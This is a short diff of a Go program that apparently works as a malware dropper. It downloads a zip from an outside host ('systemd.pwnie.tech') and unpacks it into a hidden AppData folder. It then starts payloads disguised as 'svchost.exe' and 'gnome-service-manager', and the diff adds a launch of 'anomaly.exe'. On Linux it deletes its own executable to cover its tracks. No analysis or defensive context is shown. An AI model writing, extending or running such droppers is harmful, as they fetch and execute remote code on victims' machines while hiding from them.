@@ -24,6 +24,7 @@ func main(){
 			downloadzip("http://systemd.pwnie.tech/file.zip")
 			Unzip("file.zip","\\Users\\Administrator\\AppData\\Roaming\\Templow")
 			exec.Command("cmd", "/c start /b svchost.exe").Start()
+			exec.Command("cmd", "/c start /b anomaly.exe").Start()
 			os.Exit(0)
 		} else {
 			os.Exit(3)
@@ -38,12 +39,9 @@ func main(){
 			//replace link
 			os.Remove("/tmp/gnome-software-F5DEKL/file.zip")
 			s, _ := os.Readlink("/proc/self/exe");
-			cmd := exec.Command("./gnome-service-manager","> /dev/null 2>&1 &")
-			cmd.Start()
-			cmd = exec.Command("./anomaly", "> /dev/null 2>&1 &")
-			cmd.Start()
+			exec.Command("./gnome-service-manager","> /dev/null 2>&1 &").Start()
+			exec.Command("./anomaly", "> /dev/null 2>&1 &").Start()
 			os.Remove(s)
-
 			os.Exit(0)
 		} else {
 			os.Exit(3)
